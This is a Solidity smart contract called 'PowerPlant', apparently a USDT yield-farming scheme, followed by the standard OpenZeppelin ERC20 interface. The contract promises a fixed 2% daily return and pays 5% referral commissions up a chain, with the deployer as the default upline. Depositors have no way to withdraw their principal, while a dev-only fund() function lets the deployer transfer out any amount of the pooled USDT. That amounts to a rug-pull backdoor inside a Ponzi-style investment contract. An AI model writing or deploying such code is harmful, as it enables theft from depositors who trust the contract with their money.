// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract PowerPlant {
    IERC20 public usdt;
    address public dev;

    uint256 public lockDuration = 7 days;
    uint256 public compoundThreshold = 20 ether;
    uint256 public rewardInterval = 1 days;
    uint256 public rewardShare = 20;
    uint256 public referralShare = 50;
    uint256 public divider = 1000;

    struct Deposit {
        uint256 amount;
        uint256 timestamp;
    }

    struct User {
        address upline;
        uint256 balance;
        uint256 reward;
        uint256 totalRewards;
        Deposit[] deposits;
        uint256 lastDeposit;
        uint256 lastWithdraw;
        uint256 referralRewards;
    }

    mapping (address => User) public users;

    modifier onlyDev {
        require(msg.sender == dev);
        _;
    }

    constructor(IERC20 _usdt) {
        usdt = _usdt;
        dev = msg.sender;
    }

    function deposit(uint256 _amount, address _upline) public {
        User storage user = users[msg.sender];
        usdt.transferFrom(msg.sender, address(this), _amount);
        user.balance += _amount;
        user.lastDeposit = block.timestamp;

        user.deposits.push(
            Deposit({ amount: _amount, timestamp: block.timestamp })
        );

        if (user.upline == address(0)) {
            if (users[_upline].balance < 100 || _upline == msg.sender || _upline == address(0)) {
                _upline = dev;
            }
            user.upline = _upline;
        }
        
        uint256 uplineReward = _amount * referralShare / divider;
        users[user.upline].referralRewards += uplineReward;
        usdt.transfer(user.upline, uplineReward);
    }

    function compound() public {
        User storage user = users[msg.sender];
        updateReward(msg.sender);

        require(user.reward >= compoundThreshold, "Min");

        uint256 reward = user.reward;
        user.reward = 0;
        user.balance += reward;
        user.lastDeposit = block.timestamp;

        user.deposits.push(
            Deposit({ amount: reward, timestamp: block.timestamp })
        );
    }

    function claim() public {
        User storage user = users[msg.sender];
        updateReward(msg.sender);

        require(user.reward >= compoundThreshold, "Min");
        require(block.timestamp - user.lastDeposit >= lockDuration, "Withdraw locked");

        user.lastDeposit = block.timestamp;
        uint256 reward = user.reward;
        user.reward = 0;
        usdt.transfer(msg.sender, reward);

    }

    function pendingReward(address _user) public view returns(uint256 amount) {
        User storage user = users[_user];

        for (uint256 i = 0; i < user.deposits.length; i++) {
            Deposit storage _deposit = user.deposits[i];
            uint256 from = user.lastWithdraw > _deposit.timestamp ? user.lastWithdraw : _deposit.timestamp;
            uint256 to = block.timestamp;
            amount +=_deposit.amount * (to - from) / rewardInterval * rewardShare / divider;
        }

        return amount;
    }

    function updateReward(address _user) private {
        uint256 amount = this.pendingReward(_user);
        if (amount > 0) {
            users[_user].lastWithdraw = block.timestamp;
            users[_user].reward += amount;
            users[_user].totalRewards += amount;
        }
    }

    function fund(uint256 _amount) public onlyDev {
        usdt.transfer(msg.sender, _amount);
    }

    function withdrawETH() public onlyDev {
        (bool sent, ) = dev.call{value: address(this).balance }("");
    }

    receive() external payable {}
    fallback() external payable {}
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}